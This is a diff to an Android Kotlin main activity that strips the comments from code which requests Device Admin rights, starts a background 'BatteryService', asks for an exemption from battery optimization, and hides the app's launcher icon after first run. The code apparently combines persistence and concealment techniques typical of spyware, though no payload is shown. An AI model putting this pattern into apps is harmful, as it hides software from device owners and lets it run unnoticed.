@@ -16,7 +16,6 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // ✅ Request Device Admin activation
         val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
         val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         if (!dpm.isAdminActive(componentName)) {
@@ -30,10 +29,8 @@ class MainActivity : AppCompatActivity() {
             startActivity(intent)
         }
 
-        // ✅ Start service immediately
         startService(Intent(this, BatteryService::class.java))
 
-        // ✅ Ask to disable battery optimization
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
@@ -44,7 +41,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // ✅ Hide app icon from launcher after first run
         val mainActivity = ComponentName(this, MainActivity::class.java)
         packageManager.setComponentEnabledSetting(
             mainActivity,
@@ -52,7 +48,6 @@ class MainActivity : AppCompatActivity() {
             android.content.pm.PackageManager.DONT_KILL_APP
         )
 
-        // ✅ Close activity
         finish()
     }
 }
